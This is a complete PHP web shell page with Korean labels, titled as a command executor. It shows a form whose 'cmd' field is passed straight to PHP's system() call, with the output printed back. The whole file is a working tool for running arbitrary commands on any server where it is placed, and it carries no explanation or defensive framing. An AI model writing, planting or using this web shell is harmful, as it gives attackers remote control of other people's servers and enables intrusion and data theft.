<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>PHP 웹쉘 (CMD 실행)</title>
</head>
<body>
    <h2>🔧 명령어 실행기</h2>
    <form method="GET">
        <input type="text" name="cmd" placeholder="명령어 입력 예: ls -la" size="50">
        <button type="submit">실행</button>
    </form>

    <hr>

    <?php
    if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
        $cmd = $_GET['cmd'];
        echo "<h4>💬 실행된 명령어: <code>" . htmlspecialchars($cmd) . "</code></h4>";
        echo "<pre>";
        system($cmd);
        echo "</pre>";
    } else {
        echo "<p>명령어를 입력하고 실행 버튼을 눌러주세요.</p>";
    }
    ?>
</body>
</html>
